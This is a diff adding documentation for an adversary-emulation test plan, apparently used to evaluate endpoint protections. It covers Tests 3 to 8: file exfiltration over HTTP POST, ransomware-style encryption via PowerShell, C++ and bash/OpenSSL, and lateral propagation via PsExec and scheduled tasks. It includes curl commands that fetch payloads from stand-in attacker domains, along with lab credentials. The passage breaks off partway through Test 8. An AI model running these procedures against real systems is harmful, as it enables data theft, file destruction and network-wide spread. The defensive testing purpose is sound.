+pre-positioning an executable file on a victim host
+<code v-pre>lisa (10.222.25.65)</code> at the location <code v-pre>/tmp/test3</code>. A
+terminal window will be opened as user <code v-pre>user2</code> and the executable
+will be run without arguments.</p>
+<p>The test begins with enumeration of all user directories inside of <code v-pre>/home/</code>.
+All files found in the <code v-pre>Desktop</code>, <code v-pre>Documents</code>, or <code v-pre>Downloads</code> directories will
+be zipped into zip archives up to 1MB.</p>
+<p>After all of the zips have been created, the executable will upload
+each zip archive to the adversary server via HTTP POST requests.</p>
+<doc-anchor-target id="setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F528;</span> Setup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>Ensure the Simple File Server handler is enabled and running from your Kali
+attack host <code v-pre>corsair (223.246.0.70)</code></p>
+</li>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, open
+Powershell and SSH into the victim host <code v-pre>lisa (10.222.25.65)</code> as
+<code v-pre>sonicbeats37.fm\sooyoung</code> using the following command:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">ssh sooyoung@10.222.25.65</code></pre>
+</doc-codeblock></div>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>lisa.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\sooyoung</td>
+<td>Dental-Crew</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p>Execute the following command in your terminal to download the test
+binary from the attacker server:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">curl --output &quot;/tmp/test3&quot; http://c4sh-m0n33y.fr/files/test3</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Change directories to the directory containing the <code v-pre>test3</code> binary.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">cd /tmp</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Change the binary to be executable</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">chmod +x test3</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="biohazard-procedures-2">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-2">#</doc-anchor-trigger>
+        <span>:biohazard: Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>Execute the test binary.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">./test3</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Check the control server log to ensure that the zip archives were uploaded to
+the attack host.</p>
+</li>
+<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).</p>
+</li>
+</ul>
+<doc-anchor-target id="cleanup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F9F9;</span> Cleanup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>From the <code v-pre>/tmp/</code> directory, run the following command to remove the created
+zip files and executable from the victim host, and check that everything has
+been successfully removed.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">rm archive*
+rm test3
+ls</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Terminate the controlServer via &#x27;ctrl+c&#x27; from your Kali machine</p>
+</li>
+</ul>
+<doc-anchor-target id="att-ck-techniques-and-reference-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#att-ck-techniques-and-reference-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F50D;</span> ATT&amp;CK Techniques and Reference Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> NOTE: Only the techniques under test are listed in this table</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Red Team Activity</th>
+<th>Source Code Link</th>
+<th>ATT&amp;CK Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/bin/bash executes test3</td>
+<td>-</td>
+<td>T1059.004 Command and Scripting Interpreter: Unix Shell</td>
+</tr>
+<tr>
+<td>test3 enumerates files in all user Desktop, Documents, and Downloads folders</td>
+<td><a href="../resources/protections/test3/main.go#L38">getTargetFiles</a></td>
+<td>T1083 File and Directory Discovery</td>
+</tr>
+<tr>
+<td>test3 zips target directories in 1MB chunks</td>
+<td><a href="../resources/protections/test3/main.go#L63">zipTargetDirs</a></td>
+<td>T1560.002 Archive Collected Data: Archive via Library</td>
+</tr>
+<tr>
+<td>test3 exfiltrates zip archives using HTTP POST</td>
+<td><a href="../resources/protections/test3/main.go#L146">exfilZips</a></td>
+<td>T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol</td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="test-4-powershell-script-encryption">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-4-powershell-script-encryption">#</doc-anchor-trigger>
+        <span>Test 4: PowerShell Script Encryption</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Test 4 emulates a ransomware threat actor attempting to encrypt files on
+a remote windows file server using a PowerShell script. The
+setup includes copying the contents of a PowerShell script from a non-victim
+browser. A PowerShell window will be opened as user <code v-pre>yoona</code>. The script
+will be executed with the appropriate arguments targeting the mounted drive of the
+managed remote file server.</p>
+<p>The test begins with enumeration of all files and
+directories inside of <code v-pre>Z:\</code> using <code v-pre>Get-ChildItem</code>.
+After all files have been enumerated, they will all be encrypted using
+an encryption key generated by the test4 application.
+Target files will be overwritten by the corresponding encrypted contents.</p>
+<doc-anchor-target id="setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F528;</span> Setup</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, RDP into the
+victim host <code v-pre>bts (10.222.25.61)</code> as <code v-pre>sonicbeats37.fm\yoona</code> if not already connected.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bts.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\yoona</td>
+<td>Exposed-Backpack</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><p>Search for and open PowerShell</p>
+</li>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> In a Browser on a <strong>non-victim machine</strong>, browse to <a href="../resources/protections/test4/test4.ps1">test4.ps1</a>
+and copy the script contents.</p>
+</li>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to the RDP to <code v-pre>bts (10.222.25.61)</code>. Paste the test4.ps1
+content into the PowerShell window and press enter.</p>
+</li>
+</ul>
+<doc-anchor-target id="biohazard-procedures-3">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-3">#</doc-anchor-trigger>
+        <span>:biohazard: Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Execute the test with the target file path.</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">Execute-Test -action encrypt -startFolder Z:\</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><span class="docs-emoji">&#x1F4F7;</span> Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).</li>
+</ul>
+<doc-anchor-target id="cleanup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F9F9;</span> Cleanup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Rerun the the test4 script with the <code v-pre>decrypt</code> action.</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">Execute-Test -action decrypt -startFolder Z:\ -key [KEY GENERATED DURING ENCRYPTION]</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="att-ck-techniques-and-reference-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#att-ck-techniques-and-reference-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F50D;</span> ATT&amp;CK Techniques and Reference Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> NOTE: Only the techniques under test are listed in this table</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Red Team Activity</th>
+<th>Source Code Link</th>
+<th>ATT&amp;CK Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>powershell.exe executes test4.ps1</td>
+<td>-</td>
+<td>T1059.001 Command and Scripting Interpreter: PowerShell</td>
+</tr>
+<tr>
+<td>test4.ps1 enumerates all files and folders recursively in Z:\</td>
+<td><a href="../resources/protections/test4/test4.ps1#L64">Get-ChildItem</a></td>
+<td>T1083 File and Directory Discovery</td>
+</tr>
+<tr>
+<td>test4.ps1 encrypts files discovered in Z:\</td>
+<td><a href="../resources/protections/test4/test4.ps1#L12">encryption</a></td>
+<td>T1486 Data Encrypted For Impact</td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="test-5-remote-api-and-library-encryption">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-5-remote-api-and-library-encryption">#</doc-anchor-trigger>
+        <span>Test 5: Remote API and Library Encryption</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Test 5 emulates a ransomware threat actor attempting to encrypt files on
+a remote windows file server using third party libraries and Windows API&#x27;s. The
+setup includes pre-positioning an executable file on an unmanaged victim host
+<code v-pre>eyescream (199.88.44.201)</code> at the location <code v-pre>C:\Windows\Temp\test5.exe</code>. A
+command prompt window will be opened as user <code v-pre>yoona</code>. The executable
+will be executed with the argument <code v-pre>Z:\</code> targeting the mounted drive of the
+managed remote file server.</p>
+<p>The test begins with enumeration of all files and
+directories inside of <code v-pre>Z:\</code>. Any file that is deemed not a
+system file, sym-link, or directory will be added to a file list.
+After all files have been enumerated, they will all be encrypted using
+an encryption key generated by the test5 application. The executable will
+sleep for 250-1000 milliseconds after each file is encrypted.</p>
+<doc-anchor-target id="setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F528;</span> Setup</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, RDP into the
+victim host <code v-pre>eyescream (199.88.44.201)</code> as <code v-pre>op1</code> if not already connected.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>199.88.44.201</td>
+<td>op1</td>
+<td>Subpar-Parabola</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><p>Search for and open Command Prompt</p>
+</li>
+<li><p>Execute the following command to transfer the file to the victim host:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">curl --output &quot;C:\Windows\Temp\test5.exe&quot; http://223.246.0.70/files/test5.exe</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Change directories to the directory containing the <code v-pre>test5.exe</code> binary.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">cd C:\Windows\Temp</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Execute the following command to ensure the <code v-pre>Z:</code> network drive is mapped:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">net use</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p>If the Z: is not mounted to <code v-pre>asix (10.222.15.15)</code>, mount the
+share and enter the password when prompted:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">net use Z: \\10.222.15.15\D$\data /persistent:yes /user:sonicbeats37.fm\sooyoung Dental-Crew</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="biohazard-procedures-4">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-4">#</doc-anchor-trigger>
+        <span>:biohazard: Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Execute the test binary with the target file path.</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">C:\Windows\Temp\test5.exe Z:\ encrypt</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><span class="docs-emoji">&#x1F4F7;</span> Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).</li>
+</ul>
+<doc-anchor-target id="cleanup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F9F9;</span> Cleanup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Rerun the the test5 application with the <code v-pre>decrypt</code> argument and unmount the file share.</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">C:\Windows\Temp\test5.exe Z:\ decrypt
+net use Z: /delete</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="att-ck-techniques-and-reference-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#att-ck-techniques-and-reference-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F50D;</span> ATT&amp;CK Techniques and Reference Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> NOTE: Only the techniques under test are listed in this table</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Red Team Activity</th>
+<th>Source Code Link</th>
+<th>ATT&amp;CK Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>cmd.exe executes test5.exe</td>
+<td>-</td>
+<td>T1059.003: Command and Scripting Interpreter: Windows Command Shell</td>
+</tr>
+<tr>
+<td>test5.exe enumerates all files and folders recursively in Z:\</td>
+<td><a href="../resources/protections/test5/src/enum.cpp#L17">enumeration</a></td>
+<td>T1083 File and Directory Discovery</td>
+</tr>
+<tr>
+<td>test5.exe uses FindFirstFile and FindNextFile to enumerate files in Z:\</td>
+<td><a href="../resources/protections/test5/src/enum.cpp#L26">FindFirstFile</a></td>
+<td>T1106 Native API</td>
+</tr>
+<tr>
+<td>test5.exe encrypts files discovered in Z:\</td>
+<td><a href="../resources/protections/test5/src/main.cpp#L18">encryption</a></td>
+<td>T1486 Data Encrypted For Impact</td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="test-6-bash-script-encryption">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-6-bash-script-encryption">#</doc-anchor-trigger>
+        <span>Test 6: Bash Script Encryption</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Test 6 emulates a ransomware threat actor attempting to encrypt files on
+a Linux file system using OpenSSL in a bash script. The
+setup includes pre-positioning a bash file on victim host
+<code v-pre>lisa (10.222.25.65)</code> at the location <code v-pre>/tmp/test6.sh</code>. The script
+will be executed with the argument <code v-pre>/home</code>.</p>
+<p>Once the script is executed it will begin enumerating all files and
+directories inside of <code v-pre>/home</code>. Any file that is deemed not a directory
+will be encrypted using an encryption key generated with OpenSSL inside
+the test6 bash script.</p>
+<doc-anchor-target id="setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F528;</span> Setup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>From your Kali attack host <code v-pre>corsair (223.246.0.70)</code>, open a new terminal tab
+and execute the following command to transfer the file to the victim host:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">scp /opt/kalidev/LockBit/Resources/payloads/test6.sh sooyoung@10.222.25.65:/tmp/</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, open
+Powershell and SSH into the victim host <code v-pre>lisa (10.222.25.65)</code> as <code v-pre>sonicbeats37.fm\sooyoung</code>
+using the following command:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">ssh sooyoung@10.222.25.65</code></pre>
+</doc-codeblock></div>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>lisa.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\sooyoung</td>
+<td>Dental-Crew</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p>Adjust the bash script permissions to allow the script to execute:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">chmod +x /tmp/test6.sh</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="biohazard-procedures-5">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-5">#</doc-anchor-trigger>
+        <span>:biohazard: Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Execute the test bash script with the target file path.</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sudo /tmp/test6.sh /home</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><span class="docs-emoji">&#x1F4F7;</span> Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).</li>
+</ul>
+<doc-anchor-target id="cleanup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F9F9;</span> Cleanup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>No cleanup available for Test 6. Reset <code v-pre>lisa (10.222.25.65)</code> if needed.</li>
+</ul>
+<doc-anchor-target id="att-ck-techniques-and-reference-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#att-ck-techniques-and-reference-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F50D;</span> ATT&amp;CK Techniques and Reference Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> NOTE: Only the techniques under test are listed in this table</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Red Team Activity</th>
+<th>Source Code Link</th>
+<th>ATT&amp;CK Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/bin/bash executes test6.sh</td>
+<td>-</td>
+<td>T1059.004 Command and Scripting Interpreter: Unix Shell</td>
+</tr>
+<tr>
+<td>test6.sh enumerates files in /home</td>
+<td><a href="../resources/protections/test6/test6.sh#L14">recurse_directories</a></td>
+<td>T1083 File and Directory Discovery</td>
+</tr>
+<tr>
+<td>test6.sh Encrypts files discovered on disk with OpenSSL using Blowfish in CBC mode</td>
+<td><a href="../resources/protections/test6/test6.sh#L8">encrypt_file</a></td>
+<td>T1486 Data Encrypted For Impact</td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="test-7-propagation-netbios-and-psexec">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-7-propagation-netbios-and-psexec">#</doc-anchor-trigger>
+        <span>Test 7: Propagation: NetBIOS and PsExec</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Test 7 emulates a threat actor that uses NetBIOS scans and PsExec to propagate
+across Windows devices in a network.</p>
+<p>The test setup includes pre-positioning an executable file on a Windows
+workstation <code v-pre>bts (10.222.25.61)</code> at the location <code v-pre>C:\Windows\Temp\test7.exe</code>.
+A command prompt window will be opened as domain admin <code v-pre>sooyoung</code>. The executable
+will be executed with no arguments and will log activity to <code v-pre>test7.log</code> in the
+current working directory.</p>
+<p>The test begins with discovering which local networks the workstation is on and
+scanning those networks with NetBIOS lookups to see which IP addresses respond
+as Windows machines. Upon having discovered at least one Windows target, the
+test binary will drop an embedded PsExec binary to disk at <code v-pre>C:\Windows\Temp\pm.exe</code>
+and run it to copy itself and execute itself on each target. The propagated
+processes will attempt to run as the SYSTEM user.</p>
+<doc-anchor-target id="setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F528;</span> Setup</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, RDP into the
+victim host <code v-pre>bts (10.222.25.61)</code> as <code v-pre>sonicbeats37.fm\sooyoung</code>.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bts.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\sooyoung</td>
+<td>Dental-Crew</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>Search for Command Prompt and right-click to Run As Administrator then execute
+the following command to download the test binary from the attacker server:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">curl.exe --output &quot;C:\Windows\Temp\test7.exe&quot; http://off1ce-p4p4r.co.uk/files/test7.exe</code></pre>
+</doc-codeblock></div>
+<ul>
+<li>In the Command Prompt window, change directories to the directory
+containing the <code v-pre>test7.exe</code> binary.</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">cd C:\Windows\Temp</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="biohazard-procedures-6">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-6">#</doc-anchor-trigger>
+        <span>:biohazard: Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Execute the test binary</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">C:\Windows\Temp\test7.exe</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p>If the command prompt window remains open, look through the terminal output to
+confirm that NetBIOS scanning found at least 1 target and that PsExec was
+successfully dropped and executed against the target hosts.</p>
+</li>
+<li><p>If the EDR tooling closes the command prompt window as part of its blocking
+process, open a PowerShell terminal and run the following command to view the
+log file and determine how far the test binary got prior to the block:</p>
+</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">type C:\Windows\Temp\test7.log</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><span class="docs-emoji">&#x1F4F7;</span> Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).</li>
+</ul>
+<doc-anchor-target id="cleanup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F9F9;</span> Cleanup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Open an elevated PowerShell prompt on workstation and execute the following:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">rm -force C:\windows\temp\test7.exe
+rm -force C:\Windows\temp\pm.exe
+Invoke-Command -Computer exo -Scriptblock {
+    rm -force C:\Windows\test7.exe;
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="att-ck-techniques-and-reference-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#att-ck-techniques-and-reference-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F50D;</span> ATT&amp;CK Techniques and Reference Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> NOTE: Only the techniques under test are listed in this table</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Red Team Activity</th>
+<th>Source Code Link</th>
+<th>ATT&amp;CK Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>cmd.exe executes test7.exe</td>
+<td>-</td>
+<td>T1059.003: Command and Scripting Interpreter: Windows Command Shell</td>
+</tr>
+<tr>
+<td>test7.exe discovers local IP networks via GetAdaptersInfo</td>
+<td><a href="../resources/protections/test7/src/latmove/local_ips.rs#L21">get_local_ipv4_and_cidr</a></td>
+<td>T1016 System Network Configuration Discovery</td>
+</tr>
+<tr>
+<td>test7.exe performs NetBIOS scans</td>
+<td><a href="../resources/protections/test7/src/latmove/nbtscan/lib.rs#L52">scan</a></td>
+<td>T1018 Remote System Discovery</td>
+</tr>
+<tr>
+<td>test7.exe executes PsExec to propagate to additional targets</td>
+<td><a href="../resources/protections/test7/src/psexec.rs#L105">run_psexec</a></td>
+<td>T1021.002 Remote Services: SMB/Windows Admin Shares</td>
+</tr>
+<tr>
+<td>PsExec creates a service</td>
+<td>-</td>
+<td>T1543.003 Create or Modify System Process: Windows Service</td>
+</tr>
+<tr>
+<td>PsExec copies test7.exe to additional targets</td>
+<td>-</td>
+<td>T1570 Lateral Tool Transfer</td>
+</tr>
+<tr>
+<td>PsExec executes test7.exe on additional targets</td>
+<td>-</td>
+<td>T1569.002 System Services: Service Execution</td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="test-8-propagation-network-share-and-scheduled-tasks">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-8-propagation-network-share-and-scheduled-tasks">#</doc-anchor-trigger>
+        <span>Test 8: Propagation: Network Share and Scheduled Tasks</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Test 8 emulates a threat actor that uses remote scheduled tasks to propagate
+from a file server to hosts that are connected to the file server&#x27;s shares.</p>
+<p>The test setup includes pre-positioning an executable file on a file server
+<code v-pre>asix (10.222.15.15)</code> at the location <code v-pre>C:\Windows\Temp\test8.exe</code>. A
+command prompt window will be opened as domain admin user <code v-pre>sooyoung</code>. The executable
+will be executed with no arguments and will log activity to <code v-pre>test8.log</code> in the current
+working directory.</p>
+<p>The test begins with enumeration of all hosts that have a connected network
+session to the file server. For each discovered host, the test binary will copy
+itself to the <code v-pre>C:\Windows\System32</code> folder of the remote host and then create a
+scheduled task <code v-pre>\Microsoft\Windows\Net Session File Management Task</code> on the
+remote host. The created task will automatically execute 15 seconds after being
+registered.</p>
+<doc-anchor-target id="setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F528;</span> Setup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> RDP into the victim workstation <code v-pre>bts (10.222.25.61)</code> as <code v-pre>sonicbeats37.fm\yoona</code> if not already connected.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bts.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\yoona</td>
